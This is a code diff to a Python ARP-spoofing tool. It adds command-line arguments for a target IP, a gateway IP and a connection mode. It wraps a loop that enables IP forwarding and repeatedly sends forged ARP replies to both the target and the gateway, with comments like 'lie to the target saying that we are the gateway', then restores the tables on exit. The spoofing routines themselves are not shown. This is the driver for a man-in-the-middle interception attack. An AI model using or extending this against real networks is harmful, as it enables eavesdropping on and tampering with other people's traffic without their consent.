@@ -19,6 +19,9 @@ def parse_args():
 
     try:
         parser = ArgumentParser(description=program_desc)
+        parser.add_argument('-t', '--target', dest='target_ip', type=str, help="Target IP address", required=True)
+        parser.add_argument('-g', '--gateway', dest='gateway_ip', type=str, help="Gateway IP address", required=True)
+        parser.add_argument('-c', '--connection', dest='con_mode', type=str, help="Connection mode [wifi or eth]", required=True)
 
     except KeyboardInterrupt:
         exit()
@@ -26,21 +29,32 @@ def parse_args():
         sys.stderr.write(f"{program_name}: {repr(e)}")
         sys.stderr.write("      For help, use -h or --help.")
         exit()
+    
+    return parser.parse_args()
 
-# if __name__ == "main":
-target_ip = ""
-gateway_ip = ""
-enableIPRoute("Windows")
 
-try:
-    spoofer = Spoofer(con_mode="eth")
-    while True:
-        # spoof(target_ip, gateway_ip)    # lie to the target saying that we are the gateway
-        spoofer.spoof(target_ip, gateway_ip)    # like to the target saying that the gateway's IP is a non-existent one
-        spoofer.spoof(gateway_ip, target_ip)    # lie to the gateway saying that we are the target
-        time.sleep(1)
-except KeyboardInterrupt:
-    print("Restoring the network, please wait...")
-    spoofer.unspoof(target_ip, gateway_ip)  # tell the target who the gateway really is
-    spoofer.unspoof(gateway_ip, target_ip)  # tell the gateway who the target really is
+def main():
+    args = parse_args()
+    target_ip = args.target_ip
+    gateway_ip = args.gateway_ip
+    con_mode = args.con_mode
+
+    enableIPRoute("Windows")
+
+    try:
+        spoofer = Spoofer(con_mode)
+        while True:
+            # spoof(target_ip, gateway_ip)    # lie to the target saying that we are the gateway
+            spoofer.spoof(target_ip, gateway_ip)    # like to the target saying that the gateway's IP is a non-existent one
+            spoofer.spoof(gateway_ip, target_ip)    # lie to the gateway saying that we are the target
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("Restoring the network, please wait...")
+        spoofer.unspoof(target_ip, gateway_ip)  # tell the target who the gateway really is
+        spoofer.unspoof(gateway_ip, target_ip)  # tell the gateway who the target really is
+
+if __name__ == "__main__":
+    main()
+
+
     
